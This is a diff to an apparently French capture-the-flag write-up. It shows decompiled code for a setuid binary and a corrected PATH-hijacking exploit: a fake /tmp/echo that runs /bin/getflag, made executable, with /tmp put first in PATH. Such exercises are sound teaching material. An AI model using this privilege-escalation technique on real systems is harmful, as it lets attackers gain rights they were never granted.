@@ -24,7 +24,7 @@ void main(void)
 {
     undefined4 uVar1;
     undefined4 uVar2;
-    
+
     uVar1 = getegid();
     uVar2 = geteuid();
     setresgid(uVar1, uVar1, uVar1);
@@ -33,7 +33,7 @@ void main(void)
     return;
 }
 
-Selon le man: 
+Selon le man:
 
 getegid() returns the effective group ID of the calling process.
 
@@ -63,6 +63,8 @@ On peut alors exploiter le path !
 
 echo "/bin/getflag" > /tmp/echo
 
-export PATH=/tmp
+chmod +x /tmp/echo
+
+export PATH=/tmp:$PATH
 
 ./level03
